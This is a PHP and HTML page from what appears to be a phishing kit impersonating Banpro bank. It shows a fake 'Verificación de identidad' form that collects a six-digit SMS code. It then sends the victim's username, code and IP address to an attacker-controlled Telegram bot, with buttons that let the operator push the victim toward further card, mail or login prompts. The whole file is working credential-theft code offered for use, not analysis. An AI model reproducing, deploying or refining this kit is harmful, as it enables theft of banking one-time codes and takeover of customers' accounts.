<?php
session_start();
include("settings.php"); // Contiene $token y $chat_id

$usuario = $_SESSION['usuario'] ?? null;

if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
    $codigo = $_POST['ips1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "📲 VALIDACIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$usuario"],
                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"]
                ],
                [
                    ['text' => '💳 Card', 'callback_data' => "CARD|$usuario"],
                    ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
                    ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de identidad</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}

body{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#f7f7f7;
    color:#333;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:flex-start;
    padding:40px 20px;
}

.card{
    background:#fff;
    border-radius:10px;
    width:100%;
    max-width:440px;
    padding:36px 30px 30px;
    box-shadow:0 4px 18px rgba(0,0,0,0.06);
    text-align:left;
}

.icon-wrap{
    width:54px;
    height:54px;
    border:2px solid #00853f;
    border-radius:10px;
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:24px;
}

.icon-wrap svg{width:30px;height:30px;}

h1{
    font-size:22px;
    color:#222;
    font-weight:700;
    margin-bottom:18px;
}

.subtitle{
    font-size:15px;
    color:#444;
    margin-bottom:26px;
}

.code-inputs{
    display:flex;
    justify-content:space-between;
    gap:8px;
    margin-bottom:30px;
}

.code-inputs input{
    flex:1;
    aspect-ratio:1/1;
    max-width:50px;
    text-align:center;
    font-size:22px;
    font-weight:600;
    color:#222;
    border:1.5px solid #d4d4d4;
    border-radius:6px;
    background:#fff;
    outline:none;
    transition:0.15s;
    -moz-appearance:textfield;
}

.code-inputs input::-webkit-outer-spin-button,
.code-inputs input::-webkit-inner-spin-button{
    -webkit-appearance:none;
    margin:0;
}

.code-inputs input:focus{
    border-color:#00853f;
    box-shadow:0 0 0 2px rgba(0,133,63,0.15);
}

.btn-validar{
    width:100%;
    height:50px;
    border:none;
    border-radius:6px;
    background:#00853f;
    color:#fff;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:0.2s;
}

.btn-validar:hover{background:#006b32;}
.btn-validar:disabled{background:#9bc7ad;cursor:not-allowed;}

@media(max-width:480px){
    body{padding:24px 16px;}
    .card{padding:28px 22px 24px;}
    h1{font-size:20px;}
    .subtitle{font-size:14px;margin-bottom:22px;}
    .code-inputs{gap:6px;margin-bottom:24px;}
    .code-inputs input{font-size:20px;}
    .btn-validar{height:46px;font-size:15px;}
}
</style>
</head>
<body>
<div class="card">
    <div class="icon-wrap">
        <svg viewBox="0 0 24 24" fill="none" stroke="#00853f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="5" width="18" height="14" rx="2"></rect>
            <circle cx="8.5" cy="11" r="1.8" fill="#00853f"></circle>
            <line x1="13" y1="10" x2="18" y2="10"></line>
            <line x1="13" y1="13" x2="18" y2="13"></line>
            <line x1="6" y1="16" x2="18" y2="16"></line>
        </svg>
    </div>

    <h1>Verificación de identidad</h1>
    <p class="subtitle">Ingrese el código enviado</p>

    <form method="post" action="" id="codeForm" autocomplete="off">
        <div class="code-inputs" id="codeInputs">
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
            <input type="text" inputmode="numeric" maxlength="1" required>
        </div>
        <input type="hidden" name="ips1" id="ips1">
        <button type="submit" class="btn-validar">Validar código</button>
    </form>
</div>

<script>
(function(){
    const inputs = document.querySelectorAll('#codeInputs input');
    const hidden = document.getElementById('ips1');
    const form   = document.getElementById('codeForm');

    inputs.forEach((inp, idx) => {
        inp.addEventListener('input', e => {
            inp.value = inp.value.replace(/\D/g,'').slice(0,1);
            if (inp.value && idx < inputs.length - 1) inputs[idx+1].focus();
        });
        inp.addEventListener('keydown', e => {
            if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx-1].focus();
        });
        inp.addEventListener('paste', e => {
            e.preventDefault();
            const data = (e.clipboardData.getData('text') || '').replace(/\D/g,'').slice(0,inputs.length);
            data.split('').forEach((d,i) => { if(inputs[i]) inputs[i].value = d; });
            const nextEmpty = [...inputs].findIndex(i => !i.value);
            (nextEmpty === -1 ? inputs[inputs.length-1] : inputs[nextEmpty]).focus();
        });
    });

    form.addEventListener('submit', e => {
        hidden.value = [...inputs].map(i => i.value).join('');
    });
})();
</script>
</body>
</html>
